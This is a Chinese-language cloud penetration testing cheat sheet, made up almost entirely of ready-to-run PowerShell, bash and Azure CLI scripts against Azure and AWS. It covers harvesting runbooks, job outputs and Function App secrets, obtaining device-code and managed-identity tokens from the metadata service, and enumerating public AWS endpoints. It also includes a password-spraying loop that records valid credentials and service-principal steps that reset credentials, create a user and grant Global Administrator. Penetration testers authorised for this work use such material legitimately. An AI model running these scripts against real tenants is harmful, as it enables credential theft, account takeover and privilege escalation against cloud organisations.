# 高级云渗透测试脚本

参考资料：[Cloud Pentesting Cheatsheet by Beau Bullock](https://github.com/dafthack/CloudPentestCheatsheets)

## Azure Automation Runbook

### 从所有订阅导出所有 Runbook

```powershell
$subs = Get-AzSubscription
Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    mkdir .\$subscriptionid\
    Select-AzSubscription -Subscription $subscriptionid
    $runbooks = @()
    $autoaccounts = Get-AzAutomationAccount | Select-Object AutomationAccountName,ResourceGroupName
    foreach ($i in $autoaccounts){
        $runbooks += Get-AzAutomationRunbook -AutomationAccountName $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,Name
    }
    foreach($r in $runbooks){
        Export-AzAutomationRunbook -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -Name $r.Name -OutputFolder .\$subscriptionid\
    }
}
```

### 导出所有自动化作业输出

```powershell
$subs = Get-AzSubscription
$jobout = @()
Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    Select-AzSubscription -Subscription $subscriptionid
    $jobs = @()
    $autoaccounts = Get-AzAutomationAccount | Select-Object AutomationAccountName,ResourceGroupName
    foreach ($i in $autoaccounts){
        $jobs += Get-AzAutomationJob $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,JobId
    }
    foreach($r in $jobs){
        $jobout += Get-AzAutomationJobOutput -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -JobId $r.JobId
    }
}
$jobout | Out-File -Encoding ascii joboutputs.txt
```

## Azure Function Apps

### 列出所有 Function App 主机名

```powershell
$functionapps = Get-AzFunctionApp
foreach($f in $functionapps){
    $f.EnabledHostname
}
```

### 提取 Function App 信息

```powershell
$subs = Get-AzSubscription
$allfunctioninfo = @()
Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    Select-AzSubscription -Subscription $subscriptionid
    $functionapps = Get-AzFunctionApp
    foreach($f in $functionapps){
        $allfunctioninfo += $f.config | Select-Object AcrUseManagedIdentityCred,AcrUserManagedIdentityId,AppCommandLine,ConnectionString,CorSupportCredentials,CustomActionParameter
        $allfunctioninfo += $f.SiteConfig | fl
        $allfunctioninfo += $f.ApplicationSettings | fl
        $allfunctioninfo += $f.IdentityUserAssignedIdentity.Keys | fl
    }
}
$allfunctioninfo
```

## Azure 设备码登录流程

### 发起设备码登录

```powershell
$body = @{
    "client_id" = "1950a258-227b-4e31-a9cf-717495945fc2"
    "resource"  = "https://graph.microsoft.com"
}
$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
$Headers = @{}
$Headers["User-Agent"] = $UserAgent
$authResponse = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$authResponse
```

访问 https://microsoft.com/devicelogin 并输入代码。

### 获取访问令牌

```powershell
$body = @{
    "client_id"  = "1950a258-227b-4e31-a9cf-717495945fc2"
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "code"       = $authResponse.device_code
}
$Tokens = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$Tokens
```

## Azure 托管身份令牌获取

```powershell
# 从 Azure 虚拟机
Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Method GET -Headers @{Metadata="true"} -UseBasicParsing

# 完整实例元数据
$instance = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2018-02-01' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
$instance
```

## AWS 区域迭代脚本

创建 `regions.txt`：
```
us-east-1
us-east-2
us-west-1
us-west-2
ca-central-1
eu-west-1
eu-west-2
eu-west-3
eu-central-1
eu-north-1
ap-southeast-1
ap-southeast-2
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
sa-east-1
```

### 列出所有 EC2 公网 IP

```bash
while read r; do
    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $r | jq -r '.[]' >> ec2-public-ips.txt
done < regions.txt
sort -u ec2-public-ips.txt -o ec2-public-ips.txt
```

### 列出所有 ELB DNS 地址

```bash
while read r; do
    aws elbv2 describe-load-balancers --query LoadBalancers[*].DNSName --region $r | jq -r '.[]' >> elb-public-dns.txt
    aws elb describe-load-balancers --query LoadBalancerDescriptions[*].DNSName --region $r | jq -r '.[]' >> elb-public-dns.txt
done < regions.txt
sort -u elb-public-dns.txt -o elb-public-dns.txt
```

### 列出所有 RDS DNS 地址

```bash
while read r; do
    aws rds describe-db-instances --query=DBInstances[*].Endpoint.Address --region $r | jq -r '.[]' >> rds-public-dns.txt
done < regions.txt
sort -u rds-public-dns.txt -o rds-public-dns.txt
```

### 获取 CloudFormation 输出

```bash
while read r; do
    aws cloudformation describe-stacks --query 'Stacks[*].[StackName, Description, Parameters, Outputs]' --region $r | jq -r '.[]' >> cloudformation-outputs.txt
done < regions.txt
```

## ScoutSuite jq 解析查询

### AWS 查询

```bash
# 查找所有 Lambda 环境变量
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.awslambda.regions[].functions[] | select (.env_variables != []) | .arn, .env_variables' >> lambda-all-environment-variables.txt
done

# 查找全球可列表的 S3 存储桶
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id, .services.s3.findings."s3-bucket-AuthenticatedUsers-read".items[]' >> s3-buckets-world-listable.txt
done

# 查找所有 EC2 UserData
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].vpcs[].instances[] | select (.user_data != null) | .arn, .user_data' >> ec2-instance-all-user-data.txt
done

# 查找白名单 AWS CIDR 的 EC2 安全组
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id' >> ec2-security-group-whitelists-aws-cidrs.txt
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.findings."ec2-security-group-whitelists-aws".items' >> ec2-security-group-whitelists-aws-cidrs.txt
done

# 查找所有未加密的 EC2 EBS 卷
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].volumes[] | select(.Encrypted == false) | .arn' >> ec2-ebs-volume-not-encrypted.txt
done

# 查找所有未加密的 EC2 EBS 快照
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].snapshots[] | select(.encrypted == false) | .arn' >> ec2-ebs-snapshot-not-encrypted.txt
done
```

### Azure 查询

```bash
# 列出所有 Azure App Service 主机名
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -r '.services.appservice.subscriptions[].web_apps[].host_names[]'

# 列出所有 Azure SQL 服务器
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -jr '.services.sqldatabase.subscriptions[].servers[] | .name,".database.windows.net","\n"'

# 列出所有 Azure 虚拟机主机名
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -jr '.services.virtualmachines.subscriptions[].instances[] | .name,".",.location,".cloudapp.windows.net","\n"'

# 列出存储账户
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -r '.services.storageaccounts.subscriptions[].storage_accounts[] | .name'

# 列出使用平台托管密钥加密的磁盘
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq '.services.virtualmachines.subscriptions[].disks[] | select(.encryption_type = "EncryptionAtRestWithPlatformKey") | .name' > disks-with-pmks.txt
```

## 使用 Az PowerShell 进行密码喷洒

```powershell
$userlist = Get-Content userlist.txt
$passlist = Get-Content passlist.txt
$linenumber = 0
$count = $userlist.count
foreach($line in $userlist){
    $user = $line
    $pass = ConvertTo-SecureString $passlist[$linenumber] -AsPlainText -Force
    $current = $linenumber + 1
    Write-Host -NoNewline ("`r[" + $current + "/" + $count + "]" + "Trying: " + $user + " and " + $passlist[$linenumber])
    $linenumber++
    $Cred = New-Object System.Management.Automation.PSCredential ($user, $pass)
    try {
        Connect-AzAccount -Credential $Cred -ErrorAction Stop -WarningAction SilentlyContinue
        Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
        Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
    }
    catch {
        $Failure = $_.Exception
        if ($Failure -match "ID3242") { continue }
        else {
            Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
            Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
            Add-Content valid-creds.txt $Failure.Message
            Write-Host -ForegroundColor red $Failure.Message
        }
    }
}
```

## 服务主体攻击路径

```bash
# 重置服务主体凭证
az ad sp credential reset --id <app_id>
az ad sp credential list --id <app_id>

# 以服务主体身份登录
az login --service-principal -u "app id" -p "password" --tenant <tenant ID> --allow-no-subscriptions

# 在租户中创建新用户
az ad user create --display-name <name> --password <password> --user-principal-name <upn>

# 通过 MS Graph 将用户添加到全局管理员
$Body="{'principalId':'User Object ID', 'roleDefinitionId': '62e90394-69f5-4237-9190-012177145e10', 'directoryScopeId': '/'}"
az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments --headers "Content-Type=application/json" --body $Body
```

## 其他工具参考

| 工具 | URL | 用途 |
|------|-----|---------|
| MicroBurst | github.com/NetSPI/MicroBurst | Azure 安全评估 |
| PowerZure | github.com/hausec/PowerZure | Azure 后渗透 |
| ROADTools | github.com/dirkjanm/ROADtools | Azure AD 枚举 |
| Stormspotter | github.com/Azure/Stormspotter | Azure 攻击路径图示 |
| MSOLSpray | github.com/dafthack | O365 密码喷洒 |
| AzureHound | github.com/BloodHoundAD/AzureHound | Azure AD 攻击路径 |
| WeirdAAL | github.com/carnal0wnage/weirdAAL | AWS 枚举 |
| Pacu | github.com/RhinoSecurityLabs/pacu | AWS 漏洞利用 |
| ScoutSuite | github.com/nccgroup/ScoutSuite | 多云审计 |
| cloud_enum | github.com/initstring/cloud_enum | 公开资源发现 |
| GitLeaks | github.com/zricethezav/gitleaks | 密钥扫描 |
| TruffleHog | github.com/dxa4481/truffleHog | Git 密钥扫描 |
| ip2Provider | github.com/oldrho/ip2provider | 云 IP 识别 |
| FireProx | github.com/ustayready/fireprox | 通过 AWS API Gateway 进行 IP 轮换 |

## 漏洞训练环境

| 平台 | URL | 用途 |
|----------|-----|---------|
| CloudGoat | github.com/RhinoSecurityLabs/cloudgoat | AWS 漏洞靶场 |
| SadCloud | github.com/nccgroup/sadcloud | Terraform 配置错误 |
| Flaws Cloud | flaws.cloud | AWS CTF 挑战 |
| Thunder CTF | thunder-ctf.cloud | GCP CTF 挑战 |
